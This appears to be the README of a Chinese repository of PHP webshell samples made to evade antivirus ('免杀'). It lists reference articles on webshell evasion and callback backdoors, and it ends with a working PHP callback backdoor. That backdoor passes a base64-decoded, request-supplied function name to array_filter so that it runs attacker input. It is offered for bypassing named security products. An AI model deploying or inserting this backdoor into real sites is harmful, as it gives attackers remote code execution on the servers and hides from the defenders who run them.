
对php免杀的一些研究成果，每一文件里都写了能过哪个软件  


# 参考文献

[我们要WebShell过人！ - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/241454.html)

[PHP webshell 免杀姿势总结 | 国光](https://www.sqlsec.com/2020/07/shell.html#toc-heading-2)  

[创造tips的秘籍——PHP回调后门 | 离别歌](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  

[一些不包含数字和字母的webshell | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#)  

[第3篇：常见的Webshell查杀工具 · 应急响应实战笔记](https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84Webshell%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7.html)  

回调后门
```php
<?php
$e = $_REQUEST['e'];
$arr = array($_REQUEST['pass'],);
array_filter($arr, base64_decode($e));
?>
```
